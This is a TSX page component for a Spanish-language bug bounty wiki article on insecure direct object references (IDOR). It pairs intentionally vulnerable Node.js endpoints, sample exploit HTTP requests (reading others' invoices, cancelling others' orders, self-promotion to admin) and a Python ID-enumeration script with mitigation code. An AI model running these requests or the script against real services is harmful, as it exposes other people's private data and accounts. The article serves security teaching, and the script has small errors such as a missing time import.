/**
 * IDOR - INSECURE DIRECT OBJECT REFERENCE
 * Acceder a recursos de otros usuarios
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Key, User, Shield, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function IDORContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="¿Qué es IDOR?">
        <Paragraph>
          <Strong>Insecure Direct Object Reference (IDOR)</Strong> ocurre cuando una aplicación 
          expone referencias directas a objetos internos (IDs, nombres de archivo, etc.) sin 
          verificar que el usuario tenga permiso para acceder a ellos.
        </Paragraph>

        <AlertDanger title="Impacto Crítico">
          IDOR permite a un atacante:
          <ul className="mt-2 space-y-1">
            <ListItem>Ver documentos privados de otros usuarios</ListItem>
            <ListItem>Modificar pedidos/transacciones ajenas</ListItem>
            <ListItem>Acceder a facturas, recibos, historial médico</ListItem>
            <ListItem>Eliminar contenido de otros usuarios</ListItem>
            <ListItem>Escalar privilegios (acceder a admin panels)</ListItem>
          </ul>
        </AlertDanger>

        <AlertInfo>
          IDOR es una de las vulnerabilidades más reportadas en Bug Bounty 
          porque es fácil de encontrar pero puede tener impacto severo.
        </AlertInfo>
      </Section>

      <Section id="ejemplo-basico" title="1. IDOR Básico - Cambiar ID en URL">
        <Subsection title="Escenario Vulnerable">
          <CodeBlock
            language="javascript"
            title="Node.js - Endpoint sin autorización"
            code={`app.get('/api/invoice/:id', async (req, res) => {
  const invoiceId = req.params.id;
  
  // ❌ VULNERABLE - Solo verifica que exista, no si pertenece al usuario
  const invoice = await db.invoices.findById(invoiceId);
  
  if (!invoice) {
    return res.status(404).json({ error: 'Invoice not found' });
  }
  
  // Sin verificar ownership, retorna la factura
  res.json(invoice);
});`}
          />
        </Subsection>

        <Subsection title="Explotación">
          <Paragraph>
            Un usuario autenticado puede simplemente incrementar el ID para ver facturas de otros:
          </Paragraph>

          <TerminalOutput title="Peticiones HTTP">
            {`# Usuario ve su propia factura
GET /api/invoice/1523 HTTP/1.1
Cookie: session=abc123

Response:
{
  "id": 1523,
  "user_id": 42,
  "total": 99.99,
  "items": [...]
}

# Cambiar ID para ver factura de otro usuario
GET /api/invoice/1524 HTTP/1.1
Cookie: session=abc123

Response:
{
  "id": 1524,
  "user_id": 87,  ← ¡Diferente usuario!
  "total": 1599.99,
  "credit_card": "4532-****-****-9876"
}`}
          </TerminalOutput>

          <AlertWarning>
            Con IDOR, el atacante puede iterar todos los IDs y extraer TODAS las facturas 
            de TODOS los usuarios.
          </AlertWarning>
        </Subsection>
      </Section>

      <Section id="idor-uuid" title="2. IDOR con UUIDs (No es Suficiente)">
        <Paragraph>
          Muchos developers creen que usar UUIDs en lugar de IDs secuenciales previene IDOR. 
          <Strong>Esto es FALSO</Strong>. UUIDs solo hacen la enumeración más difícil, 
          pero NO verifican autorización.
        </Paragraph>

        <CodeBlock
          language="javascript"
          title="Código aún vulnerable con UUID"
          code={`app.get('/api/document/:uuid', async (req, res) => {
  const documentUUID = req.params.uuid;
  
  // ❌ AÚN VULNERABLE - UUID no verifica ownership
  const document = await db.documents.findByUUID(documentUUID);
  
  if (!document) {
    return res.status(404).json({ error: 'Not found' });
  }
  
  // Sin verificar si el usuario actual es el owner
  res.json(document);
});`}
        />

        <Subsection title="Cómo Obtener UUIDs de Otros Usuarios">
          <CodeBlock
            language="text"
            title="Vectores de leakage de UUIDs"
            code={`1. Endpoints de listado:
   GET /api/shared-documents
   → Retorna UUIDs de documentos compartidos

2. Notificaciones/Emails:
   "Juan ha compartido documento a3f5b8c2-..."
   
3. JavaScript en el frontend:
   console.log() con UUIDs
   
4. Burp/History:
   Otros requests pueden contener UUIDs ajenos
   
5. Error messages:
   "Document a3f5b8c2-1234-... already exists"`}
          />
        </Subsection>
      </Section>

      <Section id="idor-body" title="3. IDOR en Request Body (POST/PUT)">
        <Paragraph>
          IDOR no solo ocurre en URLs. También puede estar en request bodies:
        </Paragraph>

        <CodeBlock
          language="javascript"
          title="Código vulnerable en POST"
          code={`app.post('/api/order/update', async (req, res) => {
  const { orderId, status } = req.body;
  
  // ❌ VULNERABLE - Confía en orderId del cliente
  await db.orders.updateOne(
    { id: orderId },
    { status: status }
  );
  
  res.json({ success: true });
});`}
        />

        <Subsection title="Exploit - Modificar Pedido Ajeno">
          <CodeBlock
            language="http"
            title="Request malicioso"
            code={`POST /api/order/update HTTP/1.1
Content-Type: application/json
Cookie: session=victim_session

{
  "orderId": 9999,    ← ID de pedido de otro usuario
  "status": "cancelled"
}`}
          />

          <AlertDanger>
            El atacante puede cancelar pedidos de otros usuarios, cambiar direcciones de envío, 
            o modificar precios si el backend no valida ownership.
          </AlertDanger>
        </Subsection>
      </Section>

      <Section id="idor-mass-assignment" title="4. IDOR + Mass Assignment">
        <Paragraph>
          Combinar IDOR con Mass Assignment permite escalar privilegios:
        </Paragraph>

        <CodeBlock
          language="javascript"
          title="Código doblemente vulnerable"
          code={`app.put('/api/user/:id/update', async (req, res) => {
  const userId = req.params.id;
  const updateData = req.body;
  
  // ❌ VULNERABLE #1: No verifica que userId == currentUser.id
  // ❌ VULNERABLE #2: Mass assignment - acepta cualquier campo
  await db.users.updateOne({ id: userId }, updateData);
  
  res.json({ success: true });
});`}
        />

        <CodeBlock
          language="http"
          title="Exploit - Hacerse admin"
          code={`PUT /api/user/123/update HTTP/1.1
Content-Type: application/json

{
  "role": "admin",           ← Cambiar rol a admin
  "is_verified": true,
  "balance": 999999.99
}

# Si el atacante puede cambiar su propio userId a 123 (un admin),
# o si puede adivinar el ID de un admin, obtiene privilegios`}
        />
      </Section>

      <Section id="automation" title="5. Automatización de IDOR">
        <CodeBlock
          language="python"
          title="Script - Enumerar todos los documentos"
          code={`import requests

BASE_URL = "https://vulnerable-app.com/api/document"
SESSION_COOKIE = "session=your_session_here"

def enumerate_documents(start_id, end_id):
    found_documents = []
    
    for doc_id in range(start_id, end_id):
        url = f"{BASE_URL}/{doc_id}"
        
        response = requests.get(
            url,
            cookies={'session': SESSION_COOKIE}
        )
        
        if response.status_code == 200:
            data = response.json()
            
            # Verificar si pertenece a otro usuario
            if data.get('owner_id') != YOUR_USER_ID:
                print(f"[!] IDOR Found: Document {doc_id}")
                print(f"    Owner: {data.get('owner_id')}")
                print(f"    Title: {data.get('title')}")
                found_documents.append(data)
        
        elif response.status_code == 403:
            # Existe pero acceso denegado (implementación correcta)
            print(f"[ ] Protected: {doc_id}")
        
        # Rate limiting
        time.sleep(0.5)
    
    return found_documents

# Enumerar IDs del 1 al 10000
results = enumerate_documents(1, 10000)
print(f"\\n[+] Total IDOR vulnerabilities: {len(results)}")`}
        />

        <AlertTip title="Burp Intruder">
          Usa Burp Suite Intruder para automatizar testing de IDOR:
          <ul className="mt-2 space-y-1">
            <ListItem>Captura request con ID vulnerable</ListItem>
            <ListItem>Marca el ID como posición de payload</ListItem>
            <ListItem>Payload type: Numbers (sequential)</ListItem>
            <ListItem>Analiza responses con diferentes status codes/lengths</ListItem>
          </ul>
        </AlertTip>
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ Principio Fundamental">
          <Strong>NUNCA confíes en IDs que vienen del cliente.</Strong> Siempre verifica 
          que el usuario autenticado tenga permiso para acceder al recurso.
        </AlertDanger>

        <Subsection title="1. Verificar Ownership">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Verificar que recurso pertenece al usuario"
            code={`app.get('/api/invoice/:id', async (req, res) => {
  const invoiceId = req.params.id;
  const currentUserId = req.user.id; // Del token JWT/session
  
  // ✅ SEGURO - Buscar invoice que pertenezca al usuario actual
  const invoice = await db.invoices.findOne({
    id: invoiceId,
    user_id: currentUserId  // ← KEY: Verificar ownership
  });
  
  if (!invoice) {
    // No revela si existe o no (evitar información leak)
    return res.status(404).json({ error: 'Invoice not found' });
  }
  
  res.json(invoice);
});`}
          />
        </Subsection>

        <Subsection title="2. No Exponer IDs Directos">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Usar indirect references"
            code={`// En lugar de exponer IDs de base de datos, usa mapping
const userSessionMap = new Map(); // userId → random token

app.get('/api/my-invoices', async (req, res) => {
  const currentUserId = req.user.id;
  
  const invoices = await db.invoices.findAll({
    user_id: currentUserId
  });
  
  // Generar tokens temporales para cada invoice
  const invoicesWithTokens = invoices.map(invoice => {
    const token = crypto.randomBytes(16).toString('hex');
    userSessionMap.set(token, {
      invoiceId: invoice.id,
      userId: currentUserId,
      expiresAt: Date.now() + 3600000 // 1 hora
    });
    
    return {
      token: token,  // ← Usar en lugar de ID
      total: invoice.total,
      date: invoice.date
    };
  });
  
  res.json(invoicesWithTokens);
});

app.get('/api/invoice/:token', async (req, res) => {
  const token = req.params.token;
  const mapping = userSessionMap.get(token);
  
  if (!mapping || mapping.expiresAt < Date.now()) {
    return res.status(404).json({ error: 'Not found' });
  }
  
  // Verificar que el usuario que pide es el owner
  if (mapping.userId !== req.user.id) {
    return res.status(404).json({ error: 'Not found' });
  }
  
  const invoice = await db.invoices.findById(mapping.invoiceId);
  res.json(invoice);
});`}
          />
        </Subsection>

        <Subsection title="3. ACL (Access Control List)">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Sistema de permisos robusto"
            code={`// Middleware de autorización
async function checkResourcePermission(resourceType, resourceId, permission) {
  return async (req, res, next) => {
    const userId = req.user.id;
    
    // Buscar en tabla de permisos
    const hasPermission = await db.permissions.findOne({
      resource_type: resourceType,
      resource_id: resourceId,
      user_id: userId,
      permission: permission
    });
    
    if (!hasPermission) {
      // También verificar si es owner
      const resource = await db[resourceType].findById(resourceId);
      
      if (resource.owner_id !== userId && !req.user.is_admin) {
        return res.status(403).json({ error: 'Forbidden' });
      }
    }
    
    next();
  };
}

// Uso
app.get('/api/document/:id',
  checkResourcePermission('documents', req.params.id, 'read'),
  async (req, res) => {
    const document = await db.documents.findById(req.params.id);
    res.json(document);
  }
);`}
          />
        </Subsection>

        <Subsection title="4. Rate Limiting para Prevenir Enumeración">
          <CodeBlock
            language="javascript"
            title="✅ Rate limiting con express-rate-limit"
            code={`const rateLimit = require('express-rate-limit');

const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 100, // Max 100 requests por IP
  message: 'Too many requests, please try again later',
  standardHeaders: true,
  legacyHeaders: false,
});

// Aplicar a endpoints sensibles
app.use('/api/', apiLimiter);

// Limiter más estricto para recursos específicos
const resourceLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minuto
  max: 10, // Solo 10 requests por minuto
  keyGenerator: (req) => req.user.id, // Por usuario, no por IP
});

app.get('/api/invoice/:id', resourceLimiter, async (req, res) => {
  // ...
});`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: Race Conditions</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/race-conditions`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Explotar condiciones de carrera</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
